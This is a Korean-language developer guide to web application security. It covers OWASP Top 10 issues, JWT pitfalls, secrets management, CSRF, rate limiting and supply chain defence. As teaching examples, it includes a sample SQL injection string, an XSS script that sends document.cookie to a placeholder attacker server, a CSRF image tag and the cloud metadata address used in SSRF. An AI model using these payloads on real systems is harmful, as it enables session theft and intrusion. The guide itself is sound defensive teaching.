> **대상:** 로그인·인증 기능을 만들어봤고, 이제 실제 사용자 데이터를 다루는 서비스를 안전하게 운영해야 하는 사람
> **목적:** OWASP 기준으로 실제 공격 시나리오를 이해하고, 인증·인가·시크릿 관리를 실무 수준으로 점검하는 방법을 정리합니다

# 0. 시작 전에 — 자주 나오는 용어

기초 가이드에서 다룬 인증·인가·HTTPS 개념은 이미 안다고 가정합니다. 여기서는 이 문서에서 새로 나오는 용어만 정리합니다.

| 용어 | 쉬운 설명 |
| --- | --- |
| OWASP Top 10 | 웹 서비스에서 실제로 가장 자주 발생하는 보안 취약점 10가지를 정리한 국제 기준 목록 |
| 인젝션(Injection) | 사용자 입력을 쿼리·명령어에 그대로 이어붙여, 의도치 않은 명령이 실행되게 만드는 공격 |
| 파라미터 바인딩(Parameter Binding) | 사용자 입력을 쿼리 문자열에 직접 넣지 않고 별도 값으로 전달해 인젝션을 막는 방법 |
| XSS (Cross-Site Scripting) | 사용자 입력에 담긴 스크립트가 검증 없이 화면에 그대로 그려져, 다른 사용자의 브라우저에서 실행되게 만드는 공격 |
| 살균(Sanitize) | 사용자 입력에서 위험한 태그·스크립트를 걸러내고 안전한 부분만 남기는 처리 |
| CSP (Content Security Policy) | 이 페이지에서 어떤 출처의 스크립트만 실행을 허용할지 브라우저에게 지시하는 보안 헤더 |
| 접근 제어(Access Control) | 이 사용자가 이 리소스에 접근해도 되는지를 확인하는 것 |
| 인증(Authentication) | "당신이 누구인지" 확인하는 것 (로그인) |
| 인가(Authorization) | "당신이 이걸 할 수 있는지" 확인하는 것 (권한) |
| SSRF (Server-Side Request Forgery) | 서버가 사용자 대신 외부 요청을 보내는 기능을 악용해, 내부망 등 원래 접근하면 안 되는 곳으로 요청을 보내게 하는 공격 |
| JWT (JSON Web Token) | 로그인 상태를 표현하는 토큰. 서버가 별도로 세션을 저장하지 않아도 됨 |
| Refresh Token | 로그인 유지 시간이 짧은 JWT(Access Token)를 다시 발급받기 위한 별도의 장기 토큰 |
| 최소 권한 원칙(Principle of Least Privilege) | 각 계정에 꼭 필요한 권한만 주고, 그 이상은 주지 않는 원칙 |
| 시크릿(Secret) | 비밀번호, API 키처럼 외부에 노출되면 안 되는 값 |
| bcrypt / argon2 | 비밀번호를 저장할 때 쓰는, 일부러 느리게 설계된 안전한 해시 알고리즘 |

# 1. "로그인 기능이 있다"와 "안전하다"는 다른 말

로그인 화면이 동작한다고 보안이 끝난 게 아닙니다. 공격자는 로그인 화면 자체보다, 그 뒤에 있는 데이터 접근·입력값 처리·권한 검사의 빈틈을 노립니다.

**기본 상식**: 보안은 "한 번 설정하고 끝"이 아니라 "매 기능마다 확인하는 습관"입니다. OWASP Top 10은 실무에서 실제로 가장 자주 발생하는 취약점 유형을 정리한 목록으로, 새 기능을 만들 때 체크리스트처럼 대조해보는 용도로 씁니다.

# 2. OWASP Top 10 중 실무에서 가장 자주 만나는 것들

## 인젝션(Injection)

```python
# 위험: 사용자 입력을 그대로 쿼리에 이어붙임
query = f"SELECT * FROM users WHERE email = '{user_input}'"
# user_input에 ' OR '1'='1 이 들어오면 전체 사용자 조회로 바뀜

# 안전: 파라미터 바인딩 사용
cursor.execute("SELECT * FROM users WHERE email = %s", (user_input,))
```

SQL뿐 아니라 셸 명령어, NoSQL 쿼리도 같은 원리로 위험합니다. **사용자 입력을 코드/쿼리 문자열에 직접 이어붙이지 않는 것**이 원칙입니다.

## 크로스 사이트 스크립팅(XSS)

인젝션이 "서버가 사용자 입력을 명령어로 착각"하는 문제라면, XSS는 "브라우저가 사용자 입력을 코드로 착각"하는 문제입니다. 사용자가 입력한 텍스트를 검증 없이 화면에 그대로 그리면, 그 텍스트 안에 `<script>` 태그가 있을 때 실제로 실행되어 버립니다.

```jsx
// 위험: 사용자 입력을 검증 없이 그대로 HTML로 삽입
function CommentView({ text }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
}
// text에 <script>fetch('https://공격자서버?쿠키='+document.cookie)</script> 가 들어오면
// 이 댓글을 본 다른 사용자의 브라우저에서 그대로 실행돼 로그인 정보가 유출될 수 있음

// 안전: 텍스트로만 렌더링 (React는 기본적으로 이렇게 동작함)
function CommentView({ text }) {
  return <div>{text}</div>;
}
```

| 유형 | 설명 |
| --- | --- |
| Stored XSS | 악성 스크립트가 댓글·게시글처럼 서버에 저장됐다가, 그 글을 보는 모든 사용자에게 실행됨 — 피해 범위가 가장 큼 |
| Reflected XSS | URL 파라미터 등에 담긴 스크립트가 서버 응답에 그대로 반영되어 즉시 실행됨 |
| DOM 기반 XSS | 서버를 거치지 않고, 브라우저 자바스크립트가 사용자 입력을 직접 DOM에 꽂아 넣을 때 발생 |

**기본 상식**: React·Vue 같은 최신 프레임워크는 기본적으로 텍스트를 자동 이스케이프해서 렌더링하므로, `{text}`처럼 평범하게 값을 출력하는 한 XSS에서 비교적 안전합니다. 위험은 `dangerouslySetInnerHTML`, `innerHTML`처럼 "이 문자열을 HTML로 그대로 해석해라"라고 명시적으로 지시하는 지점에서 발생합니다. 사용자 입력을 HTML로 그려야 하는 경우(리치 텍스트 에디터 등)에는 DOMPurify 같은 검증된 살균(sanitize) 라이브러리를 거칩니다. 추가 방어선으로 CSP(Content Security Policy) 헤더를 설정해두면, 스크립트가 삽입되더라도 실행 자체를 차단할 수 있습니다.

## 취약한 접근 제어(Broken Access Control)

```text
GET /api/orders/1024   → 내 주문(정상)
GET /api/orders/1025   → 로그인만 확인하고 "이 주문이 내 것인지"는 확인 안 함 → 남의 주문 조회됨
```

로그인 여부(인증)만 확인하고 "이 리소스가 이 사용자 것이 맞는지"(인가)를 빠뜨리는 실수가 실무에서 가장 흔합니다. 모든 리소스 접근마다 소유자 확인이 필요합니다.

## 암호화 실패(Cryptographic Failures)

```text
비밀번호를 평문으로 저장 → DB 유출 시 모든 계정 즉시 탈취
비밀번호를 MD5/SHA1로 해시 → 빠른 연산 속도 때문에 무차별 대입에 취약
비밀번호를 bcrypt/argon2로 해시(+salt) → 권장
```

**기본 상식**: 비밀번호는 "암호화"가 아니라 "단방향 해시"로 저장합니다(복호화가 불가능해야 함). 그리고 반드시 느리게 설계된 해시 알고리즘(bcrypt, argon2)을 씁니다 — 빠른 해시는 공격자가 대입 공격을 하기 쉽게 만듭니다.

## 서버 측 요청 위조(SSRF)

```text
사용자가 입력한 URL을 서버가 대신 요청하는 기능(썸네일 미리보기 등)
→ 사용자가 내부 서버 주소(예: 169.254.169.254 — 클라우드 메타데이터 서버)를 입력
→ 서버가 이 내부 주소로 요청을 보내 내부 정보 유출
```

외부에서 준 URL을 서버가 대신 호출하는 기능이 있다면, 내부망 주소로 향하는 요청은 반드시 차단해야 합니다.

# 3. 인증·인가 심화

## JWT를 쓸 때 흔한 실수

```text
실수 1: 만료 시간(exp)을 너무 길게 설정 → 토큰 탈취 시 오래 악용됨
실수 2: 클라이언트가 보낸 role/권한 정보를 서버가 검증 없이 그대로 신뢰
실수 3: 로그아웃해도 이미 발급된 토큰이 만료 전까지 계속 유효함(무효화 안 됨)
```

**기본 상식**: JWT는 서버가 상태를 저장하지 않아도 되는 게 장점이지만, 그만큼 "이미 발급된 토큰을 강제로 무효화"하기 어렵습니다. 만료 시간을 짧게 잡고, Refresh Token으로 갱신하는 구조를 함께 씁니다.

## 최소 권한 원칙(Principle of Least Privilege)

```text
나쁜 예: 모든 관리자 계정에 슈퍼 관리자 권한 부여
좋은 예: 콘텐츠 관리자는 콘텐츠만, 결제 관리자는 결제만 접근 가능하게 역할 분리
```

계정 하나가 뚫렸을 때 피해 범위를 그 계정의 권한만큼으로 제한하는 것이 목적입니다.

# 4. 시크릿 관리

## 코드에 시크릿을 직접 쓰지 않기

```text
절대 금지: API_KEY = "sk-abc123..." 를 코드에 하드코딩 후 커밋
```

한 번이라도 Git 히스토리에 올라간 시크릿은 **삭제해도 이미 유출된 것으로 간주**하고 즉시 재발급해야 합니다. 커밋을 지워도 과거 히스토리에는 남아있기 때문입니다.

## 환경별로 다른 시크릿, 중앙 관리

```text
로컬/개발/스테이징/운영 환경마다 다른 키 사용
운영 시크릿은 AWS Secrets Manager, Vault 같은 시크릿 관리 도구에서 런타임에 불러옴
```

**기본 상식**: `.env` 파일을 `.gitignore`에 넣는 건 최소한의 기본이고, 팀 규모가 커지면 "누가 어떤 시크릿에 접근할 수 있는지"까지 관리해야 합니다. 시크릿 관리 도구는 접근 이력을 남겨서, 유출 의심 시 누가 언제 조회했는지 추적할 수 있게 해줍니다.

# 5. 보안 점검을 습관으로 만들기

- 새 API를 만들 때마다: "인증됐는가?" 다음 "이 리소스가 이 사용자 것인가?"까지 확인했는가
- 외부 입력을 받는 모든 지점(폼, URL 파라미터, 파일 업로드)에서 검증하는가
- 의존 라이브러리에 알려진 취약점이 없는지 정기적으로 스캔하는가(`npm audit`, `pip-audit` 등)
- 에러 메시지에 내부 구조(쿼리, 스택 트레이스)가 그대로 노출되지 않는가

# 6. 자주 하는 실수

- 로그인 여부만 확인하고 리소스 소유권 확인을 빠뜨림(취약한 접근 제어)
- 사용자 입력을 쿼리 문자열에 직접 이어붙임(인젝션)
- 비밀번호를 빠른 해시(MD5 등)로 저장
- 시크릿을 코드에 하드코딩하거나 커밋 히스토리에 남김
- 에러 응답에 내부 스택 트레이스나 쿼리를 그대로 노출

# 7. 실전 체크리스트

- [ ] 모든 사용자 입력이 쿼리/명령어에 직접 이어붙여지지 않고 검증·바인딩되는가
- [ ] 모든 리소스 접근마다 소유권/권한을 확인하는가
- [ ] 비밀번호가 느린 해시 알고리즘(bcrypt/argon2)으로 저장되는가
- [ ] 시크릿이 코드가 아니라 별도 관리 도구/환경변수로 주입되는가
- [ ] 의존 라이브러리 취약점 스캔을 정기적으로 하는가

# 8. 암호화 기초 — 저장 시와 전송 시

| 구분 | 대상 | 방법 |
| --- | --- | --- |
| 전송 중 암호화(In-Transit) | 클라이언트-서버, 서버-서버 통신 | TLS(HTTPS) 적용, 만료 임박 인증서 자동 갱신 |
| 저장 시 암호화(At-Rest) | DB, 백업 파일, 파일 스토리지 | DB 볼륨 암호화, 민감 컬럼(주민번호 등)은 애플리케이션 레벨 암호화 |

```python
# 애플리케이션 레벨 컬럼 암호화 예시
from cryptography.fernet import Fernet

key = load_key_from_secret_manager()
cipher = Fernet(key)

encrypted = cipher.encrypt(ssn.encode())      # 저장 시
decrypted = cipher.decrypt(encrypted).decode()  # 조회 시
```

**기본 상식**: 암호화 키를 암호화된 데이터와 같은 곳(같은 DB, 같은 서버)에 두면 암호화의 의미가 없습니다. 키는 별도의 키 관리 서비스(AWS KMS, HashiCorp Vault)에 두고, 애플리케이션은 필요할 때만 키를 요청해 사용합니다.

# 9. 보안 헤더와 CSP

브라우저가 특정 공격을 원천 차단하도록 서버 응답에 헤더를 추가합니다.

```text
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
→ 지정하지 않은 출처의 스크립트 실행을 브라우저가 차단 (XSS 피해 최소화)

X-Content-Type-Options: nosniff
→ 브라우저가 파일 형식을 임의로 추측해 실행하는 것을 방지

Strict-Transport-Security: max-age=31536000
→ 이후 요청을 강제로 HTTPS로만 보내게 함(HTTP 다운그레이드 공격 방지)
```

**실무 팁**: CSP는 처음 적용할 때 정상 기능(외부 폰트, 분석 스크립트 등)이 막혀버리는 경우가 흔합니다. `Content-Security-Policy-Report-Only` 헤더로 먼저 위반 사례만 수집해 확인한 뒤, 문제없다고 판단되면 실제 차단 모드로 전환하는 순서를 권장합니다.

# 10. 침해 대응(Incident Response) 기초

보안 사고가 발생했을 때 우왕좌왕하지 않도록 미리 절차를 정해둡니다.

```text
1. 탐지 — 모니터링/알림으로 이상 징후 인지
2. 격리 — 피해 확산을 막기 위해 영향받은 시스템을 즉시 격리(계정 잠금, 서버 분리)
3. 조사 — 로그를 통해 침입 경로·범위 파악
4. 복구 — 취약점을 막고 정상 상태로 복원
5. 사후 분석(Postmortem) — 원인과 재발 방지 대책을 문서로 남김
6. 필요 시 사용자·관계 기관에 고지
```

**기본 상식**: 침해 대응 절차는 사고가 나기 전에 미리 정해두고 연습(모의 훈련)해야 합니다. 사고가 발생한 순간 처음 절차를 고민하면 대응이 늦어지고 판단 실수가 커집니다.

# 11. CSRF와 인증 토큰 저장 위치

## CSRF (Cross-Site Request Forgery)

로그인된 사용자가 공격자가 만든 페이지를 열었을 때, 그 페이지가 사용자 몰래 사용자의 인증 정보(쿠키)를 이용해 원치 않는 요청을 서버로 보내게 만드는 공격입니다.

```html
<!-- 공격자 사이트에 심어진 코드 -->
<img src="https://내서비스.com/api/account/delete" />
<!-- 사용자가 내 서비스에 로그인된 상태로 이 페이지를 열면
     브라우저가 쿠키를 자동으로 함께 보내 삭제 요청이 그대로 실행될 수 있음 -->
```

```text
방어 1: SameSite=Strict/Lax 쿠키 옵션 — 다른 사이트에서 시작된 요청에는 쿠키를 자동 첨부하지 않음
방어 2: CSRF 토큰 — 폼/요청마다 서버가 발급한 임의 토큰을 함께 보내고, 서버가 일치 여부를 검증
방어 3: 상태를 변경하는 요청(POST/PUT/DELETE)은 단순 GET으로 유발되지 않도록 설계
```

## 인증 토큰을 어디에 저장할 것인가

| 저장 위치 | XSS에 안전한가 | CSRF에 안전한가 |
| --- | --- | --- |
| localStorage | 취약 (스크립트로 직접 읽을 수 있음) | 안전 (자동 전송 안 됨) |
| 일반 쿠키 | 비교적 안전 | 취약 (자동 전송됨) |
| httpOnly + Secure + SameSite 쿠키 | 안전 (JS로 접근 불가) | 안전 (SameSite로 방어) |

**기본 상식**: "XSS에 안전한가"와 "CSRF에 안전한가"는 서로 다른 축의 질문입니다. `httpOnly` 쿠키는 스크립트가 직접 읽을 수 없어 XSS로 토큰을 훔치기 어렵지만, 요청 시 자동으로 전송되므로 CSRF 방어(SameSite, CSRF 토큰)를 별도로 갖춰야 완전해집니다.

# 12. 무차별 대입·자동화 공격 방어

## 로그인 Rate Limiting

```text
방어 없음: 공격자가 초당 수백 번 비밀번호를 시도(Brute Force) → 결국 뚫림
방어 있음: 같은 계정/IP에서 짧은 시간 내 실패가 반복되면 일시적으로 차단하거나 대기 시간 부여
```

```python
# 개념적 예시 — 실패 횟수를 캐시에 기록해 임계치 초과 시 차단
attempts = cache.incr(f"login_fail:{ip}:{email}")
cache.expire(f"login_fail:{ip}:{email}", 300)  # 5분 뒤 초기화
if attempts > 5:
    raise TooManyAttempts("5분 후 다시 시도해주세요")
```

## 크리덴셜 스터핑(Credential Stuffing)

다른 서비스에서 유출된 아이디·비밀번호 목록을 그대로 대입해보는 공격입니다. 사용자가 여러 사이트에서 같은 비밀번호를 재사용하는 습관을 노립니다.

```text
방어: 로그인 실패 패턴이 여러 계정에 걸쳐 분산돼 나타나면(같은 IP가 짧은 시간에
     여러 아이디를 시도) 단순 임계치보다 패턴 기반 탐지가 필요
     + 다요소 인증(MFA)을 추가하면 비밀번호가 유출돼도 추가 방어선이 생김
```

**실무 팁**: 로그인 실패 메시지는 "비밀번호가 틀렸습니다"와 "존재하지 않는 계정입니다"를 구분하지 않는 편이 안전합니다. 구분해서 알려주면 공격자가 유효한 아이디 목록을 손쉽게 수집(계정 존재 여부 확인 공격)할 수 있습니다.

# 13. 소프트웨어 공급망 보안(Supply Chain Security)

직접 짠 코드가 안전해도, 가져다 쓰는 오픈소스 패키지가 취약하면 그대로 위험이 전이됩니다.

```text
사고 사례 패턴: 인기 패키지의 의존성 중 하나가 계정 탈취 등으로 악성 코드가 주입된 버전을 배포
             → 이 패키지를 쓰는 모든 서비스가 빌드·설치 시점에 악성 코드를 함께 설치
```

```text
방어책
- package-lock.json / poetry.lock 같은 잠금 파일을 커밋해 의존성 버전을 고정
- npm audit / pip-audit / Dependabot으로 알려진 취약점 자동 스캔
- 새 의존성 추가 전 다운로드 수·최근 유지보수 여부·이슈 현황을 간단히 확인
- CI에서 SBOM(Software Bill of Materials, 사용 중인 모든 구성요소 목록)을 생성해 추적 가능하게 함
```

**기본 상식**: 취약점 스캐너가 "취약점 있음"이라고 경고해도 실제로 그 서비스가 그 취약한 코드 경로를 쓰지 않으면 당장 위험하지 않을 수 있습니다. 다만 판단을 생략하고 무시하는 습관이 들면 진짜 위험한 경고도 놓치게 되므로, 경고마다 실제 영향 여부를 짧게라도 확인하는 절차를 둡니다.

# 14. 보안 테스트 — SAST, DAST, 모의 침투

| 방법 | 시점 | 방식 |
| --- | --- | --- |
| SAST (Static Application Security Testing) | 코드 작성 시점 | 코드를 실행하지 않고 정적 분석으로 취약 패턴 탐지 (예: 인젝션 가능 코드) |
| DAST (Dynamic Application Security Testing) | 배포 후 | 실제 실행 중인 서비스에 공격 유형의 요청을 보내 취약점 확인 |
| 모의 침투 테스트(Penetration Test) | 정기/출시 전 | 전문가(또는 팀)가 실제 공격자 관점에서 직접 침투를 시도해 확인 |

```yaml
# CI 파이프라인에 SAST 도구를 넣는 예시(개념)
- name: 정적 보안 분석
  run: semgrep --config=auto ./src
```

**기본 상식**: SAST·DAST 도구는 알려진 패턴 기반이라 모든 취약점을 잡아내지 못합니다. 자동화 도구로 흔한 실수를 걸러내고, 중요한 서비스(결제, 개인정보)는 주기적으로 사람이 직접 검토하는 모의 침투 테스트를 함께 운영하는 것이 실무의 일반적인 조합입니다.
